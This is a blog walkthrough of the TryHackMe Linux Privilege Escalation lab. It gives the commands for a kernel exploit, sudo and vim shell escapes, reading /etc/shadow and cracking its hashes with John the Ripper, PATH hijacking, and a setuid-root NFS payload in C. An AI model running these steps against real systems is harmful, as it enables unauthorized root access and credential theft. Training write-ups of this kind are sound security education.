# Try Hack Me: Linux PrivEsc Complete Write-up

Today I thought to write my own write-up on two labs that I found pretty challenging: [The Linux PrivEsc](https://tryhackme.com/room/linprivesc) and [Windows PrivEsc](https://dev.to/christinecdev/try-hack-me-windows-privesc-complete-write-up-25l) labs on the Jr Penetration Tester path. Let's get started! 😊

![gif](https://media.giphy.com/media/HoffxyN8ghVuw/giphy.gif)

**<u>I will be skipping over the following tasks since it is read-only to complete:</u>**
- Task 1: Introduction 
- Task 2: What is Privilege Escalation? 
- Task 4: Automated Enumeration Tools 

## Task 3: Enumeration 
To read the instructions/general information for this section please go to the task dedicated to it. I will not be copying and pasting all the information since it will make the write-up bloated and honestly, if you're following along, it's unnecessary.

<u>**What is the hostname of the target system?**</u>
Open up your terminal via the AttackBox or OPENVPN, and let's SSH into the machine via the `ssh karen@YOUR_MACHINE_IP` command. Remember the password is Password1.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hk1v04s1f40mtc6gb67g.png)
 
Once you're logged in, we can simply run the `hostname` command to find the hostname of our target machine. Voila, our first question is answered!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4dhuhl7jetyw2fjhb0m6.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wxgw0xjaaly2lvvnipjm.png)

<u>**What is the Linux kernel version of the target system?**</u>
To find the kernel version of our system we can simply type in the `uname -a` command which will print system information giving us additional detail about the kernel used by the system.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2xr8zlbxpp8u2li77qvf.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bk4i0ycq2dtmymj9veae.png)

<u>**What Linux is this?**</u>
We can use the `cat /etc/issue` command to find the operating system version.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/19jww5vsim5i019sj4b3.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/kwu9mm447pqvjyebcu5k.png)
 
<u>**What version of the Python language is installed on the system?** </u>
This was not in the instructions, but it's a pretty obvious one. We can simply run the `python --version` command to see which version is installed.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/96lb6i9hb8cw8rlpiskh.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qreqjg4wnyes0cy8sd72.png)

<u>**What vulnerability seem to affect the kernel of the target system? (Enter a CVE number)**</u>
For this we need to do a little bit of googling/searching on Exploit-DB.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jrkli8rsfx7qycx4ti99.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/45fbvouy5i8qiimjzu8d.png)
    
## Task 5: Privilege Escalation Kernel Exploits 

**<u>Find and use the appropriate kernel exploit to gain root privileges on the target system.</u>** 
Terminate your previous machine. Now, let's go through the steps of the Kernel exploit Methodology.

<u>1. Identify the kernel version.</u>
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/85w4txccmx6c7f2x4dtv.png)
 
<u>2. Search and find an exploit code for the kernel version of the target system.</u>
This we can find with some quick Googling. [Download the exploit](https://www.exploit-db.com/exploits/37292) and move it into your `/tmp` folder.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zlou4yd7ji5f6owqlu9b.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vifpsx6s0v7vdsmhn9zv.png)

We can also get it via [searchploit](https://www.exploit-db.com/searchsploit).
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/c6f9k7ozrwgzr4rpj3n3.png)
 
**<u>What is the content of the flag1.txt file?</u>**
<u>3. Run the exploit.</u>
Okay, open up the terminal on your local machine, and start up the machine in Attackbox. In Attackbox, let's run the `id` command and take note of our current user privilege.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/uc09zovvzfpnp2mlks4f.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/r9h3ol8qyt14gg9kk4zb.png)

On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this via the `python3 -m http.server 8000` command. Don't close this terminal.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/en7rzr1l3xuqlx1qv9i2.png)

Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the `ifconfig` command and scroll down.  
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pt8hh5m40lh8icwp2gr4.png)

Cool, now we can go ahead and send our exploit that we downloaded and stored in our /tmp file to our target machine. Go to your Attackbox and first cd into your /tmp folder before connecting to your local machine. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/1dbma5vzo2ug81dr33hb.png)
 
If you don't cd into /tmp first then you will get an error when trying to connect. Now, to send the exploit and make a connection we can enter the following command (replace the IP with your ifconfig IP) `wget http://yourip:8000/37292.c`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/fnqdzjoc9n64laszm4p4.png)

Okay, the exploit is sent. Now to convert it, we can enter the following command `gcc 37292.c -o pwned`. With our exploit converted, we can run it via the `./pwned` command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/yxkbfeju37ifyznm801c.png)

Now when we run the `id` command again, we can see that our user privilege changed! We will now be able to access files with ease.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/teh7infrxsn5dxevo33s.png)

Let's cd into /home via `cd /home` because we are currently in /tmp. From /home, lets run the `ls` command to see what we can find. We have a singular directory called matt.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y9hpp91pnxbhpy5w0g1x.png)

Let's cd into matt via `cd /home/matt` and see what we can find via the `ls` command. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2nfclp88rltdl4a9kitm.png)

From there we can see that we have found the flag1.txt file. Let's read it via `cat flag1.txt`. We've successfully found the flag!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/71uqai5r1z9uvo0l219p.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/japufyg4zdmsc54ljtmq.png)
  
## Task 6: Privilege Escalation Sudo 
Terminate your previous machine and run the machine needed for this task. Open up your Attackbox to work directly in your browser, or ssh into Karen's account via your local machine's terminal.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/f7r2efjdpvegqq1nzefj.png)
 
<u>**How many programs can the user "karen" run on the target system with sudo rights? **</u>
To see how many programs "Karen" can run we have to run the `sudo -l` command. From here we can see that she can run 3 programs/commands, namely find, less, and nano.

![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h6hd0gkh9lz6mk7s9xyk.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/olx7t3dv1tg1ffzaddds.png)
 
<u>**What is the content of the flag2.txt file?**</u>
Let's first see what we can find in our current directory using `ls`. The /home directory is the most important for us, so let's cd into it. From there on, when we ls, we can see that there is a singular directory named ubuntu. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/189d8oeolt0dbc63if4o.png)

Let's cd into ubuntu via `cd /home/ubuntu`. When we run the `ls` command we can see that we successfully found the flag2.txt file.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/jjtiyqn3s5qv50vjrohj.png)

Now, we can simply `cat flag2.txt` and voila, we've found our flag!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3254pn46uzhpz5d4f020.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/dosclxl73fugk44xfbw9.png)
 
<u>**How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?**</u>  
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cpw2mjzao3dykd2tlzny.png)

<u>**What is the hash of frank's password?**</u>  
When we cd back to root via cd /, and we run the id command, we can see that we do not have root access, thus we will not be able to read Frank's password. Run `cat /etc/shadow` and you will see we cannot get access.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2gsay6cltjbsyfops512.png)
 
Let's fix that. Run `sudo nano` and press CTRL+R and CTRL+X. Enter the following command to gain root access: `reset; bash 1>&0 2>&0` and press Enter.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8dr3y7m7lo6p1giqby9c.png)

When we run the `id` command now, we can see that we have root access.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/m5rpwth1sg9tcn3h6ouh.png)
 
Now we can go ahead and run `cat /etc/shadow` again and would you know it, we can now find Frank's hashed password!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ul33teelk51zz53h2rll.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wl6042j8nhx49e0q4zpd.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/cl9bb6tt9z195v77waa0.png)
  
## Task 7: Privilege Escalation SUID 
**<u>Which user shares the name of a great comic book writer?
</u>** 
Terminate your previous machine and reconnect to Karen's IP just like before. To find the users, we can run the `cat /etc/passwd` command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tqibf96mpvgsa4a1871v.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/xrbfzqlkmxhwpas607fy.png)

**<u>Which user shares the name of a great comic book writer?
</u>** 
Before we start, on your local machine's Desktop, create a suid folder with the following files: passwd.txt and shadow.txt. Make sure you have the rockyou.txt file from previous labs in your /wordlists folder.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5y0fkgrbqhhu4m5umyng.png)

First we will need to find the password hashes for our passwd.txt file. Run the `base64 /etc/passwd | base64 --decode` command in your terminal and copy the last bit into your passwd.txt file.      
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/8klfh32wuf81zj7tgnzo.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/l2zm37bwpkhnoaw8zums.png)

Next we will need to find the password hashes for our shadow.txt file. Run the `base64 /etc/shadow | base64 --decode` command in your terminal and copy the last bit into your shadow.txt file.  
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/c0w3utvx99i2k9bqbkag.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/hiy9iec8q7r9f50vohyv.png)

Next, we need to unshadow our passwords. Head into your command line and enter the `unshadow passwd.txt shadow.txt > passwords.txt` command (where we are logged in as Karen). Our passwords.txt directory has been created.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/wy0ejn40qqgefo9w6db1.png)

Finally we can use the John The Ripper tool to crack the password. Run the command `john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zdxc32b3u5t1o8pigbq2.png)
  
At the end, you will see that the password is Password1.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rkzfv5z8a9e9p0fo9juo.png)

**<u>What is the content of the flag3.txt file?</u>**
We can use the same trick as before. Enter the command `base64 /home/ubuntu/flag3.txt | base64 --decode` in your terminal (where we are logged in as Karen). Our flag is revealed.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/phg1mz1qnx08kr34nung.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qrry9lbeoeol76n1w3q1.png)
  
## Task 8: Privilege Escalation Capabilities 
Terminate your previous session and log in as Karen (again).
**<u>How many binaries have set capabilities?</u>**
Run the `getcap -r / 2>/dev/null` command and count the binaries returned. We can count six binaries.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6m6x16d01m87h1bxxr3g.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/88e47ph3dch16dw1qyfx.png)
   
**<u>What other binary can be used through its capabilities?</u>** 
Run the `getcap -r /` command and scroll down to the bottom. We can see the other binary is view.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ar23p7bupso9fnuz3vl4.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lrgavm8rmkl19z1r1n28.png)

**<u>What is the content of the flag4.txt file?</u>**
To do this, simply enter the following command into your terminal: `./vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'` This will open up a shell.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/s4y7vixu6b6m7lt1td0a.png)
 
From there on we need to cd back into /home. Once you've done that enter `cd /home/ubuntu`, and enter `ls`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/9vf5w4ng9drleaeb60p0.png)

We can read the flag4.txt file via the cat flag4.txt command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3rbkr007jretwqfx19fc.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/zc5u5kp6w5hswl64se7m.png)
 
## Task 9: Privilege Escalation Cron Jobs 

**<u>How many user-defined cron jobs can you see on the target system?</u>**
Terminate your previous machine and log into Karens system. I'll be working from the Attackbox for this task. Let's run the `cat /etc/crontab` command. We can see there are four user-defined cron jobs:
```
* * * * *  root /antivirus.sh
* * * * *  root antivirus.sh
* * * * *  root /home/karen/backup.sh
* * * * *  root /tmp/test.py
```
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/j7tzk6k0mw0uofebzrmu.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/bnrml7efrfepjlr5jdsu.png)
 
**<u>What is the content of the flag5.txt file?  </u>**
(Please follow Task notes on THM to find the flag.)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/tchqq2yudh76s2l94dgp.png)

**<u>What is Matt's password?</u>**
(Please follow Task notes on THM to find the flag.)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/34brdgmci5a1pjdkkfx6.png)
 
## Task 10: Privilege Escalation PATH 

**<u>What is the odd folder you have write access for?</u>**
Terminate the previous machine and log into Karen's system. 
If we loop at the task notes, we can see that we can use the `find / -writable 2>/dev/null | grep home` command to find the writable folders.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/ubrqekcy6h3f9qwfzses.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/rj9gki6ad4ou378ll9sc.png)

**<u>Exploit the $PATH vulnerability to read the content of the flag6.txt file.</u>**
In your terminal where you logged in as Karen, run the `cd /home` command so that we can see which files we can access. When we run `-ls -a` we can sere that we have matt, murdoch, and ubuntu. Our flag6.txt will be under matt, but let's see whats under murdoch since we have writeable access to it.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7mwv3ro3rebqudd52ivz.png)

Once we cd into `/home/murdoch`, we can see that it has three files: test, thm and thm,py. Let's see what's in each. Before we cat each file, run the command `bash`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p6irwxcys9n0qrqiub76.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sadhwyiu5gyk1f78h012.png)

To see what's under test, run `file test`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/srv4grbwzbszv1k9wz87.png)

To see what's under thm.py, run `file thm.py` and then `cat thm.py`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7b2hoyp06o10zctbszd6.png)
  
When we try to do the same with thm, we see that no such file has been found. When we try to run `./test`, we see that it is dependent on thm, so that means we will need to create a thm file and write a little script to read the contents of our flag6.txt file.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/o9ak31cmwbzahoprdghl.png)

Create the thm file using `touch thm`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2dbho93nuop20e4vy7ly.png)
 
Write the script into this file using echo `cat /home/matt/flag6.txt" > thm`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6sr8xynwkj3z1s4bsj0p.png)
 
Now, to make this thm file executable, we need to convert it using the `chmod +x thm` command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4otk86lk95lb8h17iz0k.png)
 
Before we can now run ./test, we need to export the path via `export PATH=/home/murdoch:$PATH`
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/p0fm13db6kdpgtw6bmfm.png)
 
Finally, we can run the ./test command. We've successfully exploited our PATH vulnerability!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qbu26k07cco0phvl7nzg.png)

**<u>What is the content of the flag6.txt file?</u>**
We found the flag in the previous question after running the `./test` command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qbu26k07cco0phvl7nzg.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a01fsw7r7vfe6w4zmkpb.png)
   
## Task 11: Privilege Escalation NFS  
**<u>How many mountable shares can you identify on the target system?</u>**
Terminate the previous machine and log into Karen's system. To enumerate mountable shares from our attacking machine we need to use the `showmount -e <YOUR MACHINE IP>` command.

![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h2tvavixmuv47cd4mfqf.png)

From there on we can count three mountable shares.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/som8lnib7a0pby40jijq.png)

**<u>How many shares have the "no_root_squash" option enabled?</u>**
To see this, run the command `cat /etc/exports`. We can count three no_root_squash options.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gaiz9y5ofszmiahbvi3a.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/js5x3bl6tbprt9adggbw.png)
 
**<u>Gain a root shell on the target system</u>**
Follow the steps in the task instructions. It's exactly the same. So in a terminal, not the one you are logged in as Karen, do this:

`mkdir /tmp/sharedfolder`
`sudo mount -o rw 10.10.114.12:/home/ubuntu/sharedfolder /tmp/sharedfolder`

![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/4fta80rgqni3hoy8cn5z.png)

`nano`

```
//Enter into nano and save as nfs.c
#include <stdio.h>
#include <stdlib.h>

int main()
{
   setgid(0);
   setuid(0);
   system("/bin/bash");
   return 0;
}
```
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/43x5sxnfn17ee9gq2dui.png)
 
Now cd into the `/tmp/sharedfolder` directory and convert the .c file into an executable.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/06etckl6vxdfoecd11cn.png)
  
Now when you go over to Karen's system and cd into /home/ubuntu/sharedfolders and run the `ls -l` command, your nfs file should be there. You have now root access and can run `./nfs`.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/y67bl60utiq144ozv4s1.png)

**<u>What is the content of the flag7.txt file?</u>**
Go ahead and run the `cat /home/matt/flag7.txt` command. The flag is revealed!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/36nda5j7wzasovkzrkie.png)
 
## Task 12: Capstone Challenge

**<u>What is the content of the flag1.txt file? </u>**
Let's log into Leonard's system.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lg1bctxmlvvhlzo2bjse.png)

After that, let's see what type of privileges we have via the `whoami` and `id` commands.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/a9kfrdmqxphqszme5xgh.png)

Okay, let's see what we can find using the f`ind / -type f -perm -04000 -ls 2>/dev/null` command (we used this before). Remember in the SUID section when we used base64 to unshadow our /shadow and /passwd data? Let's do that again.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2racu9vsr56kztk9tbjg.png)

On your Desktop, create a SUID folder with two files: passwd.txt and shadow.txt. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/gxl9qf7wubasqar0pzu8.png)

In Leonard's terminal, run the` base64 /etc/shadow | base64 -d` command and copy Missy's value into the shadow.txt file.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/h1rq3x3rswftvufk8yto.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/iwimfaw9bdtu6z6j83er.png)

Then, run the` base64 /etc/passwd | base64 -d` command and copy Missy's value into the passwd.txt file.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/6jnidunwrl1jmoltbxxu.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mk3rzgx6nxm3fxkuv3rv.png)

Now, in our attacker terminal, we can use John The Ripper to crack the password. Remembet, cd /Desktop/SUID first, then run the `sudo unshadow passwd.txt shadow.txt > cracked.txt` command to create the `cracked.txt` file.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/3ix5y691s0qrqs4o4mxf.png)

Then, run the john command: `john --wordlist=/usr/share/wordlists/rockyou.txt cracked.txt` to crack the code. We can see that Missy's password is Password1.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/75i6alo05deiew7xcth5.png)

Now, back in Leonard's terminal, let's log in as Missy. Run the `su missy` command and enter her password. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/vvmcbadl4ps6g0i9kyjg.png)

The sudo -l command will reveal that missy needs no password to access data.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/sn43935irwdlerc5us19.png)

Now we can go ahead and access our flag1.txt file. First we need to find it via the `sudo find / -name "flag1.txt"` command.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/7ixnfwgqko1ivpsysc6m.png)

To read the flag, simply run `cat /home/missy/Documents/flag1.txt`. Our flag is revealed!
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/25231obkdjrn7ef34pxg.png)
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/2m9wwz4fwyyzl8p6kt4o.png)
  
**<u>What is the content of the flag2.txt file? </u>** 
let's see if we can find the flag2.txt file via the `sudo find / -name "flag2.txt"` command. We can see we need root access to access it.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/5qig92phx95f34frkqgk.png)

To do this, simply say `sudo find . -exec /bin/sh \; -quit`. 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/mtu3ve4vu3plzw2g4jkx.png)
 
Now when we run `cat /home/rootflag/flag2.txt`, we have access to the flag.
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/qios45nbjytb1a42bhl0.png) 
![Linux PrivEsc](https://dev-to-uploads.s3.amazonaws.com/uploads/articles/lvzti1h7hiwpeyg4pe6v.png)

## Conclusion
I hope this helped somewhat as this lab really challenged me, but it was so much fun and it felt good to complete it. Anyway, I got through it and now, so have you! 😀



 
 
  
